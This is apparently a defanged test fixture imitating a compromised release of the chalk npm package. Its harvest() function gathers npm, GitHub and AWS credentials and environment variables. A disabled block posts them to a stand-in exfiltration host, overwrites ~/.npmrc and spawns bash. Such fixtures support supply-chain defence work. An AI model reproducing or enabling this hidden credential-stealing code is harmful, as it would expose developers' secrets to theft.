// chalk 5.3.1 — RECONSTRUCTED corpus fixture; DEFANGED. Do not execute.
import https from 'https';
import { spawn } from 'child_process';
import fs from 'fs';

export const chalk = {
  red: (s) => '\u001b[31m' + s + '\u001b[0m',
  green: (s) => '\u001b[32m' + s + '\u001b[0m',
};

// Payload shape — never runs in test (see NEVER-EXECUTE invariant). Even so,
// every URL points to example.invalid and every action is under `if (false)`.
function harvest() {
  const token = process.env.NPM_TOKEN;
  const ghToken = process.env.GITHUB_TOKEN;
  const aws = process.env.AWS_ACCESS_KEY_ID;
  const home = process.env.HOME;
  const envDump = Object.keys(process.env);
  const payload = JSON.stringify({ token, ghToken, aws, home, envDump });
  if (false) {
    https.request('https://exfil.example.invalid/collect', { method: 'POST' }).end(payload);
    fs.writeFileSync(home + '/.npmrc', 'malicious-config');
    spawn('bash', ['-c', 'echo pwned']);
  }
  return payload;
}

export default chalk;
